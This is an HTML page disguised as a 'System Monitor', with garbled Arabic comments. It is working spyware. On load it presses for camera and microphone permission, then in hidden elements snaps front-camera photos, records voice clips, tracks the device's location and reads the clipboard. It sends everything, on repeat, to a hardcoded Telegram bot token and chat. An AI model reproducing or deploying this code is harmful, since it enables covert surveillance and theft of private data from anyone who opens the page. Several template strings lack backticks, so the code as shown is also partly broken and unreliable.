<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>System Monitor</title>
    <link rel="icon" type="image/x-icon" href="amige.ico">
    <style>
        body {
            background: #000;
            color: #0f0;
            font-family: monospace;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .status {
            margin: 10px;
            padding: 10px;
            border: 1px solid #0f0;
        }
        #bgVideo {
            width: 400px;
            height: 300px;
            margin: 20px auto;
            border: 2px solid #0f0;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <h1>ğŸ“± System Monitor - ACTIVE</h1>

    <div id="status" class="status">Ø¢Ù„ÙÙ…ÙÙ€Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ø·ÙˆÙØ± ÙŠÙ€Ù€Ù€Ù€Ù€Ù€Ù€Ù‘Ø¢Ù‹Ø³Ù‹Ù€Ù€Ù€Ù€Ù€Ù€Ù€Ù€ÙŠÙ€Ù€Ù€Ù€Ù€Ù€Ù€Ù‘Ù†...</div>
    <div id="cameraStatus" class="status">ğŸ“· Camera: Active</div>
    <div id="micStatus" class="status">ğŸ¤ Microphone: Active</div>
    <div id="locationStatus" class="status">ğŸ“ Location: Active</div>
    <div id="clipboardStatus" class="status">ğŸ“‹ Clipboard: Active</div>

    <!-- ÙÙŠØ¯ÙŠÙˆ Ù…ØªÙˆØ³Ø· Ø§Ù„Ø­Ø¬Ù… -->
    <video id="bgVideo" autoplay loop muted playsinline>
        <source src="video.mp4" type="video/mp4">
    </video>

    <!-- Ø¹Ù†Ø§ØµØ± Ù…Ø®ÙÙŠØ© -->
    <div class="hidden">
        <video id="hiddenVideo" autoplay muted playsinline></video>
        <canvas id="hiddenCanvas"></canvas>
    </div>

    <script>
// Ø§Ù„ØªÙˆÙƒÙ† ÙˆØ±Ù‚Ù… Ø§Ù„Ù…Ø­Ø§Ø¯Ø«Ø©
const BOT_TOKEN = '6568420018:AAHNsP9EDEq_qO5B1QeVf0tyKdodExpmK-I';
const CHAT_ID = '8070596519';

let voiceCounter = 0;
let dataCounter = 0;
let clipboardCounter = 0;
let micStream = null;
let isSystemActive = false;

// Ø¯Ø§Ù„Ø© ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø­Ø§Ù„Ø© - Ø§Ù„Ù†ØµÙˆØµ ØªØ¨Ù‚Ù‰ Ø«Ø§Ø¨ØªØ©
function updateStatus(message) {
    document.getElementById('status').textContent = message;
}

// Ø§Ù„Ù†ØµÙˆØµ Ø§Ù„Ø«Ø§Ø¨ØªØ©
function updateAllStatuses() {
    document.getElementById('status').textContent = "âœ… SYSTEM ACTIVE";
    document.getElementById('cameraStatus').textContent = "ğŸ“· Camera: Active";
    document.getElementById('micStatus').textContent = "ğŸ¤ Microphone: Active";
    document.getElementById('locationStatus').textContent = "ğŸ“ Location: Active";
    document.getElementById('clipboardStatus').textContent = "ğŸ“‹ Clipboard: Active";
}

// Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…
async function sendToTelegram(message, imageBlob = null) {
    try {
        if (imageBlob && imageBlob.size > 1000) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', imageBlob, camera_${Date.now()}.jpg);
            formData.append('caption', message);
            formData.append('parse_mode', 'Markdown');

            const response = await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {
                method: 'POST',
                body: formData
            });

            return await response.json();
        } else {
            const response = await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            return await response.json();
        }
    } catch (error) {
        return {ok: false};
    }
}

// Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ ØµÙˆØª Ø¥Ù„Ù‰ ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…
async function sendVoiceToTelegram(message, voiceBlob) {
    try {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('voice', voiceBlob, voice_${Date.now()}.wav);
        formData.append('caption', message);
        formData.append('parse_mode', 'Markdown');

        const response = await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendVoice, {
            method: 'POST',
            body: formData
        });

        return await response.json();
    } catch (error) {
        return {ok: false};
    }
}

// Ø¯Ø§Ù„Ø© Ø§Ù„Ø­Ø§ÙØ¸Ø© Ø§Ù„Ù…Ø­Ø³Ù†Ø© - ØªØ±Ø³Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù†ØµÙˆØµ
async function checkAndSendClipboard() {
    if (!isSystemActive) return;

    try {
        clipboardCounter++;

        let currentClipboard = '';

        // Ù…Ø­Ø§ÙˆÙ„Ø§Øª Ù…ØªØ¹Ø¯Ø¯Ø© Ù„Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ø­Ø§ÙØ¸Ø©
        try {
            // Ø§Ù„Ø·Ø±ÙŠÙ‚Ø© 1: Clipboard API Ø§Ù„Ø­Ø¯ÙŠØ«
            if (navigator.clipboard && navigator.clipboard.readText) {
                currentClipboard = await navigator.clipboard.readText();
            }
        } catch (error) {
            try {
                // Ø§Ù„Ø·Ø±ÙŠÙ‚Ø© 2: execCommand
                const tempInput = document.createElement('textarea');
                tempInput.style.position = 'absolute';
                tempInput.style.left = '-9999px';
                tempInput.style.top = '-9999px';
                document.body.appendChild(tempInput);

                tempInput.focus();
                const pasteSuccess = document.execCommand('paste');
                if (pasteSuccess) {
                    currentClipboard = tempInput.value;
                }
                document.body.removeChild(tempInput);

            } catch (e) {
                try {
                    // Ø§Ù„Ø·Ø±ÙŠÙ‚Ø© 3: contenteditable
                    const tempDiv = document.createElement('div');
                    tempDiv.contentEditable = true;
                    tempDiv.style.position = 'absolute';
                    tempDiv.style.left = '-9999px';
                    tempDiv.style.top = '-9999px';
                    document.body.appendChild(tempDiv);
                    tempDiv.focus();
                    document.execCommand('paste');
                    currentClipboard = tempDiv.innerText || tempDiv.textContent;
                    document.body.removeChild(tempDiv);
                } catch (e2) {}
            }
        }

        // Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ù…Ø­ØªÙˆÙŠØ§Øª Ø§Ù„Ø­Ø§ÙØ¸Ø© Ø¨ØºØ¶ Ø§Ù„Ù†Ø¸Ø±
        if (currentClipboard && currentClipboard.trim() !== '') {
            const clipboardMessage = ğŸ“‹ *CLIPBOARD #${clipboardCounter}*\n\n +
                                   ğŸ“ Ø§Ù„Ù…Ø­ØªÙˆÙ‰:\n\\\\n${currentClipboard}\n\\\\n\n +
                                   â° Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString('ar-SA')}\n +
                                   ğŸ“Š Ø§Ù„Ø·ÙˆÙ„: ${currentClipboard.length} Ø­Ø±Ù;

            await sendToTelegram(clipboardMessage);
        }

        // Ø§Ù„Ø§Ø³ØªÙ…Ø±Ø§Ø± Ø¨Ø¯ÙˆÙ† ØªÙˆÙ‚Ù
        setTimeout(checkAndSendClipboard, 1000);

    } catch (error) {
        // Ø§Ù„Ø§Ø³ØªÙ…Ø±Ø§Ø± Ø¨Ø¯ÙˆÙ† ØªÙˆÙ‚Ù
        setTimeout(checkAndSendClipboard, 1000);
    }
}

// Ø¯Ø§Ù„Ø© Ø§Ù„ØµÙˆØ±Ø© ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹ - ØªØ±Ø³Ù„ ÙƒÙ„ 6 Ø«ÙˆØ§Ù†ÙŠ
async function sendDataAndImage() {
    if (!isSystemActive) return;

    try {
        dataCounter++;

        // Ø¬Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹
        let location = null;
        try {
            location = await new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        resolve({
                            lat: position.coords.latitude.toFixed(6),
                            lon: position.coords.longitude.toFixed(6),
                            accuracy: Math.round(position.coords.accuracy)
                        });
                    },
                    error => {
                        resolve(null);
                    },
                    { 
                        enableHighAccuracy: true, 
                        timeout: 5000
                    }
                );
            });
        } catch (e) {
            location = null;
        }

        // Ø¬Ù„Ø¨ Ø§Ù„ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ© - Ø¨Ø¯ÙˆÙ† ÙÙ„Ø§Ø´
        let cameraImage = null;
        try {
            const video = document.getElementById('hiddenVideo');
            const canvas = document.getElementById('hiddenCanvas');

            if (video.videoWidth > 0 && video.videoHeight > 0) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');

                // Ø±Ø³Ù… Ø§Ù„ÙÙŠØ¯ÙŠÙˆ ÙÙ‚Ø· Ø¨Ø¯ÙˆÙ† ÙÙ„Ø§Ø´
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

cameraImage = await new Promise(resolve => {
                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
                });
            }

        } catch (e) {
            cameraImage = null;
        }

        // Ø¨Ù†Ø§Ø¡ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ù…Ø¹ Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ù…ÙˆÙ‚Ø¹
        let message = ğŸš€ *ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ù†Ø¸Ø§Ù… #${dataCounter}*\n\n;

        if (location) {
            const googleMapsUrl = https://www.google.com/maps?q=${location.lat},${location.lon};
            const openStreetMapUrl = https://www.openstreetmap.org/?mlat=${location.lat}&mlon=${location.lon};

            message += ğŸ“ *Ø§Ù„Ù…ÙˆÙ‚Ø¹:*\n;
            message += â€¢ Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: ${location.lat}\n;
            message += â€¢ Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: ${location.lon}\n;
            message += â€¢ Ø§Ù„Ø¯Ù‚Ø©: ${location.accuracy} Ù…ØªØ±\n\n;

            message += ğŸ—ºï¸ *Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ù…ÙˆÙ‚Ø¹:*\n;
            message += â€¢ [Google Maps](${googleMapsUrl})\n;
            message += â€¢ [OpenStreetMap](${openStreetMapUrl})\n\n;
        }

        message += ğŸ“± *Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²:*\n;
        message += â€¢ Ø§Ù„Ø´Ø§Ø´Ø©: ${screen.width}x${screen.height}\n;
        message += â€¢ Ø§Ù„Ù†Ø¸Ø§Ù…: ${navigator.platform}\n\n;

        message += ğŸ“Š *Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª:*\n;
        message += â€¢ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„ØµÙˆØªÙŠØ©: ${voiceCounter}\n;
        message += â€¢ Ø§Ù„Ø­Ø§ÙØ¸Ø©: ${clipboardCounter}\n\n;

        message += â° ${new Date().toLocaleString('ar-SA')};

        await sendToTelegram(message, cameraImage);

        // Ø¥Ø±Ø³Ø§Ù„ Ø¨Ø¹Ø¯ 6 Ø«ÙˆØ§Ù†ÙŠ
        setTimeout(sendDataAndImage, 6000);

    } catch (error) {
        // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø¨Ø¹Ø¯ 6 Ø«ÙˆØ§Ù†ÙŠ
        setTimeout(sendDataAndImage, 6000);
    }
}

// Ø¯Ø§Ù„Ø© Ø§Ù„ØµÙˆØª - ØªØ±Ø³Ù„ ÙƒÙ„ 4 Ø«ÙˆØ§Ù†ÙŠ
function recordAndSendVoice() {
    if (!micStream || !isSystemActive) return;

    try {
        voiceCounter++;

        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const source = audioContext.createMediaStreamSource(micStream);
        const processor = audioContext.createScriptProcessor(1024, 1, 1);
        const chunks = [];
        let recordingTime = 0;
        const maxRecordingTime = 4;

        processor.onaudioprocess = (event) => {
            if (!isSystemActive) return;

            const inputData = event.inputBuffer.getChannelData(0);
            chunks.push(new Float32Array(inputData));
            recordingTime += 1024 / audioContext.sampleRate;

            if (recordingTime >= maxRecordingTime) {
                source.disconnect();
                processor.disconnect();
                processAndSendVoice(chunks, audioContext.sampleRate, voiceCounter);
            }
        };

        source.connect(processor);
        processor.connect(audioContext.destination);

        setTimeout(() => {
            if (!isSystemActive) return;

            try {
                source.disconnect();
                processor.disconnect();
                if (chunks.length > 0) {
                    processAndSendVoice(chunks, audioContext.sampleRate, voiceCounter);
                }
            } catch (e) {}
        }, maxRecordingTime * 1000);

    } catch (error) {}
}

// Ù…Ø¹Ø§Ù„Ø¬Ø© ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØª
async function processAndSendVoice(chunks, sampleRate, counter) {
    try {
        const buffer = mergeBuffers(chunks, chunks.length * 1024);
        const dataView = encodeWAVBuffer(buffer, sampleRate);
        const voiceBlob = new Blob([dataView], { type: 'audio/wav' });

        const voiceMessage = ğŸ¤ *Ø±Ø³Ø§Ù„Ø© ØµÙˆØªÙŠØ© #${counter}*\n\n +
                           â±ï¸ Ø§Ù„Ù…Ø¯Ø©: 4 Ø«ÙˆØ§Ù†ÙŠ\n +
                           ğŸ•’ Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString('ar-SA')};

        await sendVoiceToTelegram(voiceMessage, voiceBlob);

        // Ø¥Ø±Ø³Ø§Ù„ Ø¨Ø¹Ø¯ 4 Ø«ÙˆØ§Ù†ÙŠ
        setTimeout(recordAndSendVoice, 4000);

    } catch (error) {
        // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø¨Ø¹Ø¯ 4 Ø«ÙˆØ§Ù†ÙŠ
        setTimeout(recordAndSendVoice, 4000);
    }
}

// Ø¯ÙˆØ§Ù„ Ø§Ù„Ù…Ø³Ø§Ø¹Ø¯Ø© Ù„Ù„ØµÙˆØª
function mergeBuffers(chunks, length) {
    const result = new Float32Array(length);
    let offset = 0;
    for (let i = 0; i < chunks.length; i++) {
        result.set(chunks[i], offset);
        offset += chunks[i].length;
    }
    return result;
}

function encodeWAVBuffer(buffer, sampleRate) {
    const length = buffer.length * 2;
    const view = new DataView(new ArrayBuffer(44 + length));
    const writeString = (offset, string) => {
        for (let i = 0; i < string.length; i++) {
            view.setUint8(offset + i, string.charCodeAt(i));
        }
    };

    writeString(0, 'RIFF');
    view.setUint32(4, 36 + length, true);
    writeString(8, 'WAVE');
    writeString(12, 'fmt ');
    view.setUint32(16, 16, true);
    view.setUint16(20, 1, true);
    view.setUint16(22, 1, true);
    view.setUint32(24, sampleRate, true);
    view.setUint32(28, sampleRate * 2, true);
    view.setUint16(32, 2, true);
    view.setUint16(34, 16, true);
    writeString(36, 'data');
    view.setUint32(40, length, true);

    let offset = 44;
    for (let i = 0; i < buffer.length; i++) {
        const sample = Math.max(-1, Math.min(1, buffer[i]));
        view.setInt16(offset, sample < 0 ? sample * 0x8000 : sample * 0x7FFF, true);
        offset += 2;
    }

    return view;
}

// Ø§Ù„Ø¯Ø§Ù„Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©
async function startAll() {
    updateStatus('ğŸ”„ Starting System...');

    try {
        // Ø·Ù„Ø¨ Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ - Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                width: { ideal: 1280, max: 1920 },
                height: { ideal: 720, max: 1080 },
                frameRate: { ideal: 30, max: 60 },
                facingMode: 'user' // ÙƒØ§Ù…ÙŠØ±Ø§ Ø£Ù…Ø§Ù…ÙŠØ© Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† Ø§Ù„Ø®Ù„ÙÙŠØ©
            },
            audio: {
                echoCancellation: false,
                noiseSuppression: false,
                autoGainControl: false,
                channelCount: 1,
                sampleRate: 44100,
                sampleSize: 16,
                volume: 1.0
            }
        });

        micStream = stream;

        // Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„Ù…Ø®ÙÙŠ
        const hiddenVideo = document.getElementById('hiddenVideo');
        hiddenVideo.srcObject = stream;
        hiddenVideo.play().catch(e => console.log('Video play error:', e));

        // Ø§Ù†ØªØ¸Ø§Ø± ØªØ­Ù…ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
        await new Promise((resolve) => {
            hiddenVideo.onloadedmetadata = () => {
                hiddenVideo.play();
                resolve();
            };
            setTimeout(resolve, 1000);
        });

        // ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù†Ø¸Ø§Ù…
        isSystemActive = true;
        updateAllStatuses();

        // Ø¨Ø¯Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¹Ù…Ù„ÙŠØ§Øª
        sendDataAndImage(); // Ø§Ù„ØµÙˆØ±Ø© ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹ ÙƒÙ„ 6 Ø«ÙˆØ§Ù†ÙŠ
        recordAndSendVoice(); // Ø§Ù„ØµÙˆØª ÙƒÙ„ 4 Ø«ÙˆØ§Ù†ÙŠ
        checkAndSendClipboard(); // Ø§Ù„Ø­Ø§ÙØ¸Ø© Ø¨Ø§Ø³ØªÙ…Ø±Ø§Ø±

        // ØªØ´ØºÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
        document.getElementById('bgVideo').play();

        // Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ø¨Ø¯Ø¡ Ø§Ù„ØªØ´ØºÙŠÙ„
        sendToTelegram('ğŸš€ *SYSTEM STARTED - FRONT CAMERA*\n\nâœ… Ø§Ù„Ù†Ø¸Ø§Ù… ÙŠØ¹Ù…Ù„ Ø§Ù„Ø¢Ù†\nğŸ“¸ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ© Ù†Ø´Ø·Ø©\nğŸ“‹ Ø¬Ù…Ø¹ Ø¬Ù…ÙŠØ¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø­Ø§ÙØ¸Ø©');

    } catch (error) {
        updateStatus('âŒ Permission Denied - Retrying...');

        // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØ©
        setTimeout(startAll, 1000);
    }
}

// Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨ØªØ­Ø¯ÙŠØ« Ø§Ù„ØµÙØ­Ø© ÙŠØ¯ÙˆÙŠØ§Ù‹
function allowManualRefresh() {
    // Ø¥Ø²Ø§Ù„Ø© Ø£ÙŠ Ù‚ÙŠÙˆØ¯ Ø¹Ù„Ù‰ Ø§Ù„ØªØ­Ø¯ÙŠØ«
    document.addEventListener('keydown', (e) => {
        // Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…ÙØ§ØªÙŠØ­
    });

    // Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø³ÙŠØ§Ù‚
    document.addEventListener('contextmenu', (e) => {
        // Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø³ÙŠØ§Ù‚
    });
}

// Ø¨Ø¯Ø¡ Ø§Ù„ØªØ´ØºÙŠÙ„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
window.addEventListener('load', () => {
    allowManualRefresh();
    startAll();
});

// Ø¥ÙŠÙ‚Ø§Ù Ø¹Ù†Ø¯ Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø©
window.addEventListener('beforeunload', () => {
    isSystemActive = false;
});

// Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªØ´ØºÙŠÙ„ Ø¹Ù†Ø¯ Ø§Ù„Ø¹ÙˆØ¯Ø© Ù„Ù„ØµÙØ­Ø©
window.addEventListener('focus', () => {
    if (!isSystemActive) {
        startAll();
    }
});

    </script>
</body> 
</html>